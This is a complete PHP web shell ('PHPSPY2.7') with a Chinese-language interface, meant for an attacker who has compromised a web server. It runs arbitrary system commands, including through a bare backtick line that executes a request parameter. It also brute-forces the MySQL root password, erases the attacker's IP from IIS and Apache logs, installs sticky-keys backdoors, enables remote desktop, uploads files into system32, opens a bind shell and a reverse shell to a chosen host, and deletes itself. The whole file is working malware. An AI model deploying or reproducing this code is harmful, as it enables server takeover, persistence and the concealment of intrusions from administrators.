<?php
header("Content-type: text/html; charset=gb2312");
$auth_ok=0;
$user=$_SERVER['PHP_AUTH_USER'];
$pass=md5($_SERVER['PHP_AUTH_PW']);
$pass_md5="63a9f0ea7bb98050796b649e85481845";// pass:root

if(isset($user) && isset($pass) && $user=='root' && $pass_md5==$pass){
$auth_ok=1;
}

if(!$auth_ok)
{
      header('WWW-Authenticate: Basic realm="Top Secret Area"');
      header('HTTP/1.0 401 Unauthorized');
      exit;
}

if ($_POST['getinfo']){
@ob_clean(); phpinfo();exit();
}

?>

<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=GB2312">
		<title>***PHP-command***</title>
<style type="text/css"> 
body  
{ 
background-image:  
url(''); 
background-repeat:  
no-repeat; 
background-attachment:  
fixed 
} 

textarea 
{  background-color:#000000;color:#8B0000;
	font-size:15Px;font-family:Tahoma;
	width:598px;height:245px;
}
</style> 

  <!--<script type="text/javascript" src="shell.js"></script>-->
  <script language="Javascript">
  	<!--
    
   //-->
  </script>
  </head>
	
<body bgproperties="fixed" bgcolor=#FFFFFF>
		<!--bgproperties="fixed"-->
		
<div align="center">
	<font face="Verdana" size="3" color=#000000><p>Please Input Your Command!</p>
	</font></div>
	
	
<div align="center"><font color="#000000" face="Verdana" size="3"> 
<SCRIPT language=javascript><!-- 
var isnMonths=new initArray("1月","2月","3月","4月","5月","6月","7月","8月","9月","10月","11月","12月")
var isnDays=new initArray("星期日","星期一","星期二","星期三","星期四","星期五","星期六","星期日"); 
today=new Date(); 
 
function initArray(){ 
 for(i=0;i<initArray.arguments.length;i++) 
 this[i]=initArray.arguments[i]; 
} 
 
function getFullYear(d){ 
  yr = d.getYear(); 
  if(yr<1000)  yr += 1900; 
 return yr; 
} 
var StrTemp = getFullYear(today) +"年"  +"&nbsp;" + isnMonths[today.getMonth()]; 
StrTemp = StrTemp + "" + today.getDate()+"日&nbsp;"+ isnDays[today.getDay()]; 
document.write(StrTemp); 
//--> 
</SCRIPT></font> </div>
<div align="center"><font face="Verdana" size="2" color=red>
		<b>注:如果服务器的Cmd.exe被删除将不能执行系统命令!!</b><br>
		<b>扫描可读写目录文件为所有关键盘符可能的目录文件..</b>
		</font></div>

<br>
<?php 
	    echo "<font face='Papyrus' size='2' color=blue><b>Disabled Functions: </b></font>".showdisablefunctions();
          
	    function showdisablefunctions() {
	    if ($disablefunc=@ini_get("disable_functions")){ return "<font face='Papyrus' color=#00FF00 size='2'><b>".$disablefunc."</b></font>"; }
	    else { return "<font face='Verdana' color=#00FF00 size='2'><b>NULL</b></font>"; }
	    }
?>
<br>	    
<div align="center"><table align="center" width="100%" bgcolor=#F5FFFA border=0><!-- 表格用于控制整体显示位置-->
	<tr bgcolor=#F5FFFA>
		<td align="center"  style="width:265px;">
<!-- 获取Web服务器系统相关参数部分-->
<br>
<table align="right" border="0" >
	<tr >
		<td align="left" bgcolor="" colspan="0">
		<font face="Verdana" size="2" color=#FF9900>
			<?php
			if(strtoupper(substr(PHP_OS, 0, 3))=='WIN')
			    {
			        /*      	
			     try{
								    		     
					     $shellex = new COM('W'.'Scr'.'ip'.'t.she'.'ll');
						$regname='HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections';
					      if($shellex->RegRead($regname)==1)
					      echo "远程桌面当前状态:<font color=#000000>已关闭</font><br>";
					      else
					      echo "远程桌面当前状态:<font color=#000000>已开启</font><br>";
					    if (empty($shellex))
					    {
					      throw new Exception($error);
					    }
					    
					  }catch (Exception $e) {
					       echo 'Wscript.shell 被禁用 <br>';
					      }
						*/
			    }	
			    		
			if(strtoupper(substr(PHP_OS, 0, 3))=='WIN')
			    {
			        /*      	
			     try{
								    		     
					     $shellex = new COM('W'.'Scr'.'ip'.'t.she'.'ll');
						$regname='HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\PortNumber';
					      echo "WEB服务器终端端口:<font color=#000000>".$shellex->RegRead($regname)."</font>";
					    if (empty($shellex))
					    {
					      throw new Exception($error);
					    }
					    
					  }catch (Exception $e) {
					       echo 'Wscript.shell 被禁用[端口读取失败] <br>';
					      }
						*/
			    }
      
			?></font>
		</td>
		
	<tr>
		<td align="left" bgcolor="">
		<font face="Verdana" size="2" color=#FF9900>
			<?php
			echo "WEB服务器路径:<font color=#000000>".$_SERVER['DOCUMENT_ROOT']."</font>";
			?></font>
		</td>
	
	<tr>
	<td align="left" bgcolor="">
		<font face="Verdana" size="2" color=#FF9900>
			<?php
			echo "WEB服务器域名:<font color=#000000>".$_SERVER['SERVER_NAME']."</font>";
			?></font>
		</td>
			
	<tr>
	<td align="left" bgcolor="">
		<font face="Verdana" size="2" color=#FF9900>
			<?php
			echo "WEB服务器IP:<font color=#000000>".$_SERVER['SERVER_ADDR']."</font>";
			?></font>
		</td>
		
		<tr>
		<td align="left" bgcolor="">
		<font face="Verdana" size="2" color=#FF9900>
			<?php
			echo "Your IP Is :<font color=#000000>".$_SERVER['REMOTE_ADDR']."</font>";
			?></font>
		</td>
		
	  <tr>
			<td align="left" bgcolor="">
		<font face="Verdana" size="2" color=#FF9900>
			<?php
			echo "<font color=#000000>".$_SERVER['SERVER_SOFTWARE']."</font>";
			?></font>
		</td>

	<!-- MYSQL密码破解部分-->
    <tr>
		<td align="left" bgcolor="">
     	<form name="mysqlcrack" method="post" action="">
	     <input type="submit" name="crack" value="破解本机MYSQL ROOT密码">
	    </form>
	  </td>
	  
	  
	  <!-- 清理WEB服务器日志部分-->
    <tr>
		<td align="left" bgcolor="">
     	<form name="weblog" method="post" action="">
     	 
     	<input type="submit" name="clearapachelog" value="清理Apache中的本机日志">
	    </form>
	  </td>
    
    <tr>
		<td align="left" bgcolor="">
     	<form name="weblog2" method="post" action="">
     	 
     	<input type="submit" name="cleariislog" value="清理 IIS中的本机IP日志">
	    </form>
	  </td>
	  
	  <tr>
		<td align="left" bgcolor="">
     	<form name="backdoor" method="post" action="">
     	 
     	<input type="submit" name="setupsethc" value="一键装 粘帖键sethc后门">
	    </form>
	  </td>
	  
	  
</table>
</td>

<!-- 命令提示符以及可读写目录扫描显示屏部分-->
<td align="center">
<table align="center" border="0" style="width:600px;">
	<tr>
	<td align="left" bgcolor="#FFFFFF">	
<form name="sys" method="post" action="" style="height:36px;">
	<input type="text" name="Path_IP" size="68" value="c:\windows\system32\cmd.exe">
	<select name="excutemethod" >
        <option value="exec">EXEC</option>
        <option value="shell_exec">shell_exec</option>
        <option value="popen">popen</option>
        <option value="proc_open">proc_open</option>
        <option value="system">system</option>
        <option value="passthru">passthru</option>
        <option value="wscript">Wscript</option>
        </select>
	<input type="text" name="Cmd_Port" size="68" value="">
	<input type="submit" name="Execute" value="Execute">
	
</form>
  </td>
	<tr>
		<td align="left" bgcolor="#8DB6CD">
		<font face="Verdana" size="1" color=#FFFFFF>PHP SYSCmd by cyberH4CK Good Luck!
		</font>
		</td>
	<tr>
	<td align="left" bgcolor="white">
<!--<font face="Verdana" size="2" color=#FF9900>这个标记不能用在textarea里-->
<textarea name="wcc" cols=90 rows=12 style="">			
<?php  

function Executecmd($cmd)
{

$descriptorspec = array(
   0 => array("pipe","r"),//输入
   1 => array("pipe","w"),//输出结果
   2 => array("pipe","w"),//输出错误
);
 $process = proc_open($_SERVER["COMSPEC"], $descriptorspec, $pipes);      
 if (is_resource($process)) {
  fwrite($pipes[0], $cmd."\r\n");
  fwrite($pipes[0], "exit\r\n");
  fclose($pipes[0]);
   
echo stream_get_contents($pipes[1]);
   fclose($pipes[1]);
   
echo stream_get_contents($pipes[2]);
   fclose($pipes[2]);
  
 proc_close($process);
                                                   }      
 }
 
if ($_POST['Execute'] && !empty($_POST['Cmd_Port'])){
   error_reporting(0);
   $execfunc=$_POST['excutemethod'];
   $CmdLine=trim($_POST['Cmd_Port']);

                if ($execfunc=="system") {
                        system($CmdLine);
                } elseif ($execfunc=="passthru") {
                        passthru($CmdLine);
                } elseif ($execfunc=="exec") {
                        exec($CmdLine,$result);
                        foreach($result as $value)
                        {echo $value."\n";}
                } elseif ($execfunc=="shell_exec") {
                        $result=shell_exec($CmdLine);
                        echo $result;
                } elseif ($execfunc=="popen") {
                        $pp = popen($CmdLine, 'r');
                        $read = fread($pp, 2096);
                        echo $read;
                        pclose($pp);
                                             
                } elseif ($execfunc=="proc_open") {
                        Executecmd($CmdLine);
                
                 }elseif ($execfunc=="wscript") {
               if(strtoupper(substr(PHP_OS, 0, 3))=='WIN'){
                	echo "Wscript Execute:\n";
                	
                	try{
                	
                        $wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die("PHP Create COM WSHSHELL failed");
                        $exec = $wsh->exec(trim($_POST['Path_IP'])." /c".stripslashes($CmdLine)."");
                        $stdout = $exec->StdOut();
                        $stroutput = $stdout->ReadAll();
                        echo $stroutput;
                        if (empty($wsh))
					    {
					      throw new Exception($error);
					    }
					    
	                   }catch (Exception $e) { echo 'Wscript.shell 被禁用[无法执行命令] ';}
                        
                        
                        }else{echo "这不是windows系统,不能用wscript.shell执行命令.";}
                }                                      
        }
  


//自定义目录文件权限扫描部分
if ($_POST['submit']){
	$paths = stripslashes(trim($_POST['Cmd_Port']));
	if($paths){
			
$power_xx = substr(sprintf('%o', @fileperms($paths)), -1);

switch($power_xx){
	case 2 : echo "扫描完成,请检测...".$paths." [可写]\n"; break;
	case 4 : echo "扫描完成,请检测...".$paths." [可读]\n"; break;
	case 6 : echo "扫描完成,请检测...".$paths." [可读/可写]\n"; break;
	case 7 : echo "扫描完成,请检测...".$paths." [可读/可写/可执行]\n"; break;
	
}}}

//扫描服务器关键目录文件部分的可写,可执行权限..
if ($_POST['scans']){	
//	
error_reporting(0);
echo "扫描完成,请检测...\n";
$win_start='C:/Documents and Settings/All Users/「开始」菜单/程序/启动';
$folder1=array("C:/recycler","C:/recycled","D:/recycled","E:/recycled","F:/recycled","C:/System Volume Information","D:/System Volume Information","E:/System Volume Information","F:/System Volume Information");
$folder2=array($_SERVER['DOCUMENT_ROOT'],"C:/WINDOWS","C:/WINDOWS/temp","C:/WINDOWS/system32","C:/WINDOWS/System32/Wbem",$win_start);
$folder3=array("/tmp","/var/tmp","");
$folder=array_merge($folder1,$folder2,$folder3);
foreach ($folder as $key=> $value)
{
	if(is_dir($value)){
	if(is_writable(trim($value))){
      echo $value." [可写]\n";}else 
	{echo $value." [不可写]\n";}
}
}
$programurl=array("C:/windows/system32/cmd.exe","C:/windows/system32/cscript.exe","C:/windows/system32/net.exe","C:/windows/system32/net1.exe");

foreach ($programurl as $key=> $value)
{
	if(is_file($value)){
    if (is_executable($value)) {
    echo $value." 可执行\n";} else
    {echo $value." 不可执行\n";}
}
}

$passfile=array("/etc/passwd","/etc/shadow");
foreach ($passfile as $key=> $value)
{
	if(is_file($value)){
    if (is_readable($value)) {
    echo $value."[可读]\n";} else
    {echo $value." [不可读]\n";}
}
}
  }



 function connect($pass)//定义连接MYSQL数据库函数..
     {
     $conn=@mysql_connect("127.0.0.1","root",trim($pass));
     if($conn){
     echo "得到root密码:".$pass;}
     else echo "";
     }
	   $passwd=@file("mysql.dic");
if ($_POST['crack']){ 
	   	   
	if ($passwd){
	   echo "成功读取到字典文件开始破解...";
	   set_time_limit(0);
     $strings=count($passwd);
     for($i=0; $i<$strings; $i++){
     $pass = $passwd[$i];
     //echo $pass."\n";
     @connect($pass);
     }}
     else
	   echo "无法读取到字典文件请检查..";
	   echo "扫描结束..";}

//echo date('ymd');
//清除IIS服务器Web 日志部分...
if ($_POST['cleariislog']){
if(strtoupper(substr(PHP_OS, 0, 3))=='WIN')
{
set_time_limit(0);
sleep(1);
date_default_timezone_set('Asia/Shanghai');
$iislogurl="C:\WINDOWS\system32\LogFiles\W3SVC1"."\ex".date('ymd').".log";
$filename2=$iislogurl;echo "日志路径:".$filename2."\n";
$filename=$iislogurl;//echo $filename;
$iislogfile=@file(trim($filename));
$strs=count($iislogfile);
$length=strlen($_SERVER['REMOTE_ADDR']);
if ($iislogfile){    
if (is_writable(trim($filename2)))//把清理IP地址的内容写入源日志文件...
	{
	$handle2 = @fopen(trim($filename2),'w');
	
	//接受的变量写入打开的文件中
	for($i=0; $i<$strs; $i++){
     $content = $iislogfile[$i];
     if (trim($_SERVER['REMOTE_ADDR'])==trim(substr($content,9,$length))){
     $content='';}
     @fwrite ($handle2,$content);}	
	@fclose ($handle2);

  echo "清理WEB服务器IIS日志成功,本机IP地址的访问记录将被全部清除!\n";}
	else
	echo "不好意思哟!清理失败..\n";	
}else
{echo "无法读取日志文件,可能目标文件没有读取权限或未搜索到..";}

}
}
 
//清除Apache服务器Web 日志部分...

if ($_POST['clearapachelog']){

set_time_limit(0);

@system('dir /s /b c:access.log>"D:\System Volume Information\url.txt"');
$logurl=@file("D:\System Volume Information\url.txt");
//$logurl=glob("c:\Program Files\access.log",GLOB_NOSORT);不成功

$filename2=$logurl[0];echo "日志路径:".$filename2."\n";
$filename=$logurl[0];//echo $filename;
$logfile=@file(trim($filename));
$strs=count($logfile);
$length=strlen($_SERVER['REMOTE_ADDR']);
if ($logfile){    
if (is_writable(trim($filename2)))//把清理IP地址的内容写入源日志文件...
	{
	$handle2 = @fopen(trim($filename2),'w');
	
	//接受的变量写入打开的文件中
	for($i=0; $i<$strs; $i++){
     $content = $logfile[$i];
     if (trim($_SERVER['REMOTE_ADDR'])==trim(substr($content,0,$length))){
     $content='';}
     @fwrite ($handle2,$content);}	
	@fclose ($handle2);

  echo "清理WEB服务器Apache日志成功,本机IP地址的访问记录将被全部清除!\n";}
	else
	echo "不好意思哟!清理失败..\n";	
}else
{echo "无法读取日志文件,可能目标文件没有读取权限或未搜索到..";}
unlink("D:\System Volume Information\url.txt");
}

//安装sethc 粘贴键backdoor
if ($_POST['setupsethc']){
	if(strtoupper(substr(PHP_OS, 0, 3))=='WIN')
	{
	$cmdpath="C:/WINDOWS/system32/taskmgr.exe";
	$syspath="C:/WINDOWS/system32";
	$sethc="C:/WINDOWS/system32/sethc.exe";
	$dllsethc="C:/WINDOWS/system32/dllcache/sethc.exe";
	if(file_exists($dllsethc)&&file_exists($sethc)){
	  @unlink("C:/WINDOWS/system32/dllcache/sethc.exe");
    @unlink("C:/WINDOWS/system32/sethc.exe");}
	if (file_exists($cmdpath)&&is_writable($syspath)){
		@copy($cmdpath,$dllsethc);
	  @copy($cmdpath,$sethc);
	  echo "安装sethc后门成功...";
	 }else{
	  echo "安装sethc后门失败...";}
}
}

//一个新型的php一句话cmdshell(非一句话木马) 
 
echo `$_REQUEST[cmd]`;	


if($_POST['start']){

set_time_limit(0);
$system=strtoupper(substr(PHP_OS, 0, 3));
if(!extension_loaded('sockets'))
{
  if ($system == 'WIN') {
    @dl('php_sockets.dll');
    }else{
      @dl('sockets.so');}

}

// Set up our socket
$commonProtocol = getprotobyname("SOL_TCP");
$socket = socket_create(AF_INET, SOCK_STREAM, $commonProtocol);
socket_bind($socket,$_SERVER['SERVER_ADDR'], 88); //socket_bind()     把socket绑定在一个IP地址和端口上
socket_listen($socket);
echo "监听88端口已被终止...\n";
// Initialize the buffer8

if (($msgsock = socket_accept($socket)) < 0)
     {
       echo "socket_accept() failed: reason: " . socket_strerror($msgsock) . "\n"; 
     }else{
     //发到客户端
     $msg = "----------------------PHP Connect-Forward--------------------\n";
     socket_write($msgsock, $msg, strlen($msg));
     @socket_write($msgsock,'#:');}
     //读取客户端发来的信息..
while ($buf=socket_read($msgsock,8192)){
     if(trim(strtolower($buf))=="exit")
     {
     socket_write($msgsock,"Bye!!\n");
     socket_close($msgsock);
     socket_close($socket);
     }else{
     $result=array("");
     @exec($buf,$result);}
 
     foreach($result as $value){
	 @socket_write($msgsock,$value."\n");
	  }
     @socket_write($msgsock,'#:');
     //socket_send( resource socket, string buf, int len, int flags )
     
   } 
   /*socket_close($msgsock);
   socket_close($socket);*/
}


if($_POST['stop']){

set_time_limit(0);
socket_close($msgsock);
socket_close($socket); //socket_close()     关闭一个socket资源
print("Closed the socket\r\n\r\n");
}

//开启远程终端服务...
if($_POST['open3389']){
	if(strtoupper(substr(PHP_OS, 0, 3))=='WIN')
	{
	  error_reporting(E_ERROR | E_WARNING | E_PARSE);
 
      //$regsvr32='c:\windows\system32\regsvr32.exe';
try{
	
	  $shellex = new COM('WSc'.'rip'.'t.Sh'.'ell');
	  $shellex->RegWrite('HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections',0,REG_DWORD);

	 $regname='HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections';
      if($shellex->RegRead($regname)==1)
      echo "远程桌面已关闭";
      else
      echo "远程桌面已开启";
      
       if (empty($shellex))
					    {
					      throw new Exception($error);
					    }
					    
	 }catch (Exception $e) {
					       echo 'Wscript.shell 被禁用[无法开启远程桌面] ';
					      }
//	   elseif(empty($open) and strtoupper(get_current_user())=='SYSTEM'){
//	    define ("HKEY_LOCAL_MACHINE" , 2147483650);//&H80000002
//        $regc = new COM ( 'winm'.'gmts:{impersonationLevel=impersonate}//loca'.'lhost/root/Default:StdRegProv');
//        $strKeyPath = 'SYSTEM\CurrentControlSet\Control\Terminal Server';  //注册表路径
//        $strValueName = 'fDenyTSConnections';  //注册表路径下的项名
//        $dwValue=0;
//        $reg=$regc->SetDWORDValue(HKEY_LOCAL_MACHINE,$strKeyPath,$strValueName,$dwValue);//需要设置的值存储在$dwValue变量中
//	   //var_dump($reg);
//	    if($reg==0) echo "winmgmts开启远程终端成功\n";else echo "winmgmts开启远程终端失败\n"; 
//	 
//		}     
    }
}

//映像劫持sethc.exe为taskmgr.exe...
if($_POST['hijack']){
	if(strtoupper(substr(PHP_OS, 0, 3))=='WIN')
	{
	   error_reporting(E_ERROR | E_WARNING | E_PARSE);
 try{
 	
		$shellex = new COM('WSc'.'rip'.'t.Sh'.'ell');
	  
	    if ($shellex->RegWrite('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','c:\WINDOWS\system32\taskmgr.exe',REG_SZ)){
            echo "Wscript.Shell映像劫持sethc.exe为taskmgr.exe成功\n";
		}else{echo "映像劫持sethc.exe为taskmgr.exe失败\n";}  
			
       if (empty($shellex))
					    {
					      throw new Exception($error);
					    }
					    
	  }catch (Exception $e) {
					       echo 'Wscript.shell 被禁用[无法映像劫持] ';
					      }			
			
//		elseif(strtoupper(get_current_user())=='SYSTEM'){
//	    define ("HKEY_LOCAL_MACHINE" , 2147483650);//&H80000002
//        $regc = new COM ( 'winm'.'gmts:{impersonationLevel=impersonate}//loca'.'lhost/root/Default:StdRegProv');
//        $strKeyPath = 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options';  //注册表路径
//        $strValueName = 'sethc.exe';  //注册表路径下的项名
//        $szValue='c:\WINDOWS\system32\taskmgr.exe';
//        $reg=$regc->SetStringValue(HKEY_LOCAL_MACHINE,$strKeyPath,$strValueName,$szValue);//需要设置的值存储在$dwValue变量中
//		//var_dump($reg);
//		if($reg==0) echo "winmgmts映像劫持sethc.exe为taskmgr.exe成功\n";else echo "winmgmts映像劫持sethc.exe为taskmgr.exe失败\n";  
//		
//		}
    }
}

 if($_POST['self_kill']){    
    if (unlink(__FILE__)) {ob_clean();echo "Delete success,Thanks for using syscmd !\n";}
    else {echo "Can't delete ".__FILE__."!\n";}}
 
?> 

</textarea>
</td>
	
</table>
</td>

<!-- 获取PHP配置参数部分-->
<td align="center">
<table align="left" border="0" style="width:200px;">
	
	<tr>
		<td align="left" bgcolor="">
        <font face="Verdana" size="2" color=#4B0082><?php	echo php_uname();?></font>
		</td>

	<tr>
		<td align="left" bgcolor="">
     <font face="Verdana" size="2" color=#FF9900>
			<?php
			if (get_magic_quotes_gpc()) {				
			echo "magic_quotes_gpc=<font color=#000000>"."On"."</font>";
		}
		else{
			echo "magic_quotes_gpc=<font color=#000000>"."Off"."</font>";
		}
		     ?></font>
		</td>
		
	<tr>
		<td align="left" bgcolor="">
     <font face="Verdana" size="2" color=#FF9900>
			<?php
			echo "Current user Is: <font color=#000000>". @get_current_user()."</font>";
		?></font>
	</td>
	
	<tr>
		<td align="left" bgcolor="">
     <font face="Verdana" size="2" color=#FF9900>
			<?php
			if (ini_get('register_globals')){
			echo "register_globals = <font color=#000000>On</font>";
		}else{
			echo "register_globals = <font color=#000000>Off</font>";
		}
		?></font>
	</td>
	
	<tr>
		<td align="left" bgcolor="">
     <font face="Verdana" size="2" color=#FF9900>
			<?php
			if(ini_get('safe_mode')){
			echo "safe_mode = <font color=#000000>On</font>";
		}else{
			echo "safe_mode = <font color=#000000>Off</font>";
		}
		?></font>
	</td>
	
	<tr>
		<td align="left" bgcolor="">
     <font face="Verdana" size="2" color=#FF9900>
			<?php
			if(ini_get('display_errors')){
			echo "display_errors = <font color=#000000>On</font>";
		}else{
			echo "display_errors = <font color=#000000>Off</font>";
		}
		?></font>
	</td>
	
	<tr>
		<td align="left" bgcolor="">
     <font face="Verdana" size="2" color=#FF9900>
			<?php
			echo "Zend engine version= <font color=#000000>". @zend_version()."</font>";
		?></font>
	</td>
      
      <tr>
		<td align="left" bgcolor="">
     <font face="Verdana" size="2" color=#FF9900>
			<?php
			echo "open_basedir= <font color=#000000>". ini_get('open_basedir')."</font>";
		?></font>
	</td>

<!-- 文件上传部分-->	
<tr><tr>
<td>	
<font face="Lucida Sans" color=#00FF00>
<form enctype="multipart/form-data" method="post" action="">
<input type="hidden" name="max_file_size" value="2000000">
<br><input name="upfile" type="file"><br>

选择上传目录不填为当前目录<br><input type="text" name="targetdir" size="30" value="C:/windows/System32"><br>
<input type="submit" name="upload" value="上传文件">
<input type="submit" name="scans" value="扫描可读写目录文件">
</form>

<?php
$uploaddir = stripslashes(trim($_POST['targetdir']));
if ($_POST['upload']){
if ($uploaddir){

@set_time_limit(0);
$uploadfile = $uploaddir."/". $_FILES["upfile"]["name"];

if (move_uploaded_file($_FILES["upfile"]["tmp_name"], $uploadfile))
{
print "文件上传成功,以上传到\n";
//print_r($_FILES);
$path = pathinfo ($uploadfile);

echo $path["dirname"] . "\n";//dirname文件所在目录名

}else{
print "文件上传失败!\n";

}}
else{
$uploaddir = dirname(__FILE__)."/";

$uploadfile = $uploaddir. $_FILES["upfile"]["name"];

if (move_uploaded_file($_FILES["upfile"]["tmp_name"], $uploadfile))
{
print "文件上传成功,以上传到\n";
//print_r($_FILES);
$path = pathinfo ($uploadfile);

echo $path["dirname"] . "\n";//dirname文件所在目录名

}else{
print "文件上传失败!\n";

}}}
?>
</font>
</td></table>

</td></table></div>

<br>
<table align="center" border="0" width="100%">
	<tr>
		<td align="left" bgcolor="">
		<form name="listen" method="post" action="">
     	<input type="submit" name="getinfo" value="获取phpinfo()">&nbsp;
     	<input type="submit" name="start" value="  开始监听  ">&nbsp;
     	<input type="submit" name="stop" value="  停止监听  ">&nbsp;
     	<input type="submit" name="open3389" value="开启远程终端">&nbsp;
     	<input type="submit" name="hijack" value="映像劫持sethc">&nbsp;
     	<input type="submit" name="self_kill" value=" 启动自毁 " >
	    </form>
	    
	  </td></table>
	    <br>
	    <div style="position:absolute;left:40%;top:88%">
	    <font face="Century Gothic" size="1" color=#000000>PHPSPY2.7 Made By CyberH4ck</font>
        </div>
        <br>
<?php
if(strtoupper(substr(PHP_OS, 0, 3))=='WIN')
{
	$disk=array('c:','d:','e:','f:','g:','h:','i:','j:','k:','l:','m:','n:','o:','p:','q:','r:','s:','t:','u:','v:','w:','x:','y:','z:');
	
	foreach($disk as $dk)
	{
		if(is_dir($dk))
		echo "<font face='Verdana' size='2'>".strtoupper($dk)."Freespace: ".round(@disk_free_space($dk)/1073741824,1)." Gb of ".round(@disk_total_space($dk)/1073741824,1)." Gb</font>&nbsp;&nbsp;";
	}
}

//php sockets 反弹连接
if($_POST['Execute'] && is_numeric($_POST['Cmd_Port'])){

set_time_limit(0);
$system=strtoupper(substr(PHP_OS, 0, 3));

if (!extension_loaded('sockets'))
{
 echo '没有添加sockets扩展 [Sockets Support=disabled]';
 if ($system == 'WIN') {
  @dl('php_sockets.dll');
  }else{
    @dl('sockets.so');				     						   	      
}
}

if(isset($_POST['Path_IP']) && isset($_POST['Cmd_Port']))
{
   $host = trim($_POST['Path_IP']);
   $port = trim($_POST['Cmd_Port']);
   //echo "建立反弹连接成功,反弹IP:".$host."端口:".$port."请用nc 监听...";
}

//print("注意:win的反弹需要PHP支持socket")."\n";
//print("Linux在非源码编译安装的情况一般都会支持,具体查看phpinfo()")."\n>";

       
$host=gethostbyname($host);
$protocols=getprotobyname("SOL_TCP");

 if(($sock=socket_create(AF_INET,SOCK_STREAM,$protocols))<0)
{
  echo"Socket Create Faile";
}
					    
if(($flag=socket_connect($sock,$host,$port))<0)
{
   echo"Connect Faile";
}else{
	
$message="----------------------PHP Connect-Back----------------------\n";

@socket_write($sock,$message,strlen($message));
@socket_write($sock,'#:');

while($cmd=@socket_read($sock,8192,PHP_NORMAL_READ))
   {
   if(trim(strtolower($cmd))=="exit")
   {
	   socket_write($sock," Bye!!\n");
	   socket_close($sock);
   }else
   {
	  $return=array("");
	  exec($cmd,$return);
    }
 
  foreach($return as $value){
	@socket_write($sock,$value."\n");
	}
  @socket_write($sock,'#:');
  
    }
         }
}
?>	    
	   
	
</body> 
</html>
